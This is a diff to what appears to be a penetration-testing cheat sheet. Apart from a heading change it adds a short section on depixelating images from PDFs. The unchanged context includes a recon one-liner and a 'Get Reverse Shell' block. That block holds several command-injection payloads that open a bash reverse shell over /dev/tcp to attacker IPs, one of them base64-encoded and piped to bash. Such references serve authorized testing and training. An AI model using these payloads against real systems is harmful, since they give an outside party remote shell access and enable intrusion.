@@ -527,7 +527,7 @@ assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)
 ```
 {% endcode %}
 
-#### Get Reverse Shell:
+### Get Reverse Shell:
 
 ```
 ;$(bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1');
@@ -537,6 +537,13 @@ test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQo= |
 base64 -d | bash;    (enocoded payload)
 
 test;echo 'bash -i >& /dev/tcp/10.10.16.35/9001 0>&1' | bash;
+```
+
+### Depixelate images
+
+```
+pdfimages <pdf-file> <output-file>
+python3 depix.py -p <pixelized-image>.ppm -s <reference-image>
 ```
 
 #### Opposite to Keyhacks -> nokeyhacks:
